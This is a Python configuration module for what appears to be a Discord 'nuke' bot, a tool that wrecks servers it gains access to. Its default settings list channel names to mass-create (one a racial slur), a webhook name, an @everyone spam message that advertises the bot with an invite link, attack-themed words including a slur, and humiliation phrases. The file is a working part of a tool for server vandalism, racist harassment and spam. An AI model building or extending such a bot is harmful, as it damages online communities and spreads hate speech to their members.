import json

class Config:
    def __init__(self):
        self.data = {}
        self.load()
    
    def load(self):
        try:
            with open('config.json','r')as f:self.data=json.load(f)
        except FileNotFoundError:
            self.create_default()
    
    def create_default(self):
        self.data = {
            "token": "na",
            "prefix": "+",
            "log_channel_id": 1378051952813801573,
            "exempt_guilds": [1378007619632890086,1378051952813801573],
            "owner_users": [1423287188010831984],
            "nuke": {
                "channel_names": [
                    "［🍇］graped",
                    "［👶🏿］niggered",
                    "［🔥］demolished", 
                    "［🏴‍☠️］killed"
                ],
                "webhook_name": "［✞］ᴄʀᴜᴄɪғɪᴇᴅ",
                "default_message": "@everyone This server got nuked because the owner joined our server and got this bot for absolutely FREE. Join the server now and have the bot for free! https://discord.gg/ccdyKy2mFA"
            },
            "embeds": {
                "images": [
                    "https://i.supaimg.com/0383cbe1c-a02e-4a05-ae69-994445ff3001.gif",
                    "https://i.supaimg.com/9b0cff79-7991-4a91-84c0-ec48c5691e82.png"
                ],
                "awpt_words": ["OBLITERATED",
      "ANNIHILATED",
      "NIGGERED",
      "DESTROYED",
      "CLAPPED",
      "HOED",
      "KILLED",
      "SEIZED",
      "OWNED"
    ],
    "humiliation_phrases": [
      "REST IN PISS",
      "NUKED IN BIG 26",
      "GET BETTER SECURITY ",
      "REQUIEM OWNS THIS SERVER "
    ]
  }
}
        self.save()
    
    def save(self):
        with open('config.json','w')as f:json.dump(self.data,f,indent=2)
    
    def get(self,key,default=None):
        keys=key.split('.')
        value=self.data
        for k in keys:value=value.get(k,{})
        return value if value!={}else default

config=Config()